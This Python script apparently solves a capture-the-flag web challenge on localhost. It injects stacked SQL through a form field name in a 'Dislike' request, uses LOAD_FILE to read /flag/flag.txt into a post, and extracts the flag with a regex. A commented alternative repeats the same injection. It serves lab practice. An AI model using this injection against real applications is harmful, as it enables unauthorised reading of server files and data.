#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

def main():
    url = "http://localhost:8082"
    flag_regex = re.compile("(InfoSec{.+[^}]})")

    # Create new session
    new_session = requests.Session()
   
    # Target user
    username = "abi"
    password = "pass123*"
    login_data = {'username': username, 'password': password}

    # Create user
    new_session.post(url + "/register", data = login_data)

    # Log in
    new_session.post(url + "/login", data = login_data)

    # Make a post
    csrf_token = new_session.cookies.get_dict()["csrf_token"]
    message = "sqli"
    message_data = {'content': message, 'csrf_token': csrf_token}
    new_session.post(url + "/post" , data = message_data)

    # SQL injection (via dislike)
    payload = "1\'; UPDATE post SET text = LOAD_FILE('/flag/flag.txt') WHERE id=1; -- "
    data_unlike = {'action': 'Dislike', 'csrf_token': csrf_token, payload: 'true'}
    unlike_response_data = new_session.post(url + "/likes", data = data_unlike)

    # Cut out the flag and save it to a solution file
    flag = flag_regex.findall(unlike_response_data.text)
    flag = flag[0]
    print(flag)
    sol = open("solution.txt", "w")
    sol.write(flag)
    sol.close()


    # NOTE(abi): try this solution instead.
    # register_un = "DummyUser"
    # register_pw = "12345678A+"
    # payload = {"username": register_un, "password": register_pw}

    # s = requests.Session()
    # s.post(url + '/register', data=payload)
    # s.post(url + '/login', data=payload)

    # msg = "Insert file content here"
    # payload = {"content": msg, "csrf_token": s.cookies["csrf_token"]}
    # s.post(url + '/post', data=payload)

    # # ''; UPDATE post SET text = LOAD_FILE('/flag/flag.txt') WHERE text = 'Test';--"
    # payload = {f"action": "Dislike", 
    #             "csrf_token": s.cookies["csrf_token"],
    #             "'; UPDATE post SET text = LOAD_FILE('/flag/flag.txt') WHERE text = 'Insert file content here'; -- ": ""}
    # res = s.post(url + '/likes', data=payload)

    # flag_regex = re.compile("(InfoSec{.+[^}]})")
    # flag = re.findall(flag_regex, res.text)
    # flag = flag[0]
    # print(flag.replace("</td></tr>", ""))


# ------------------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass


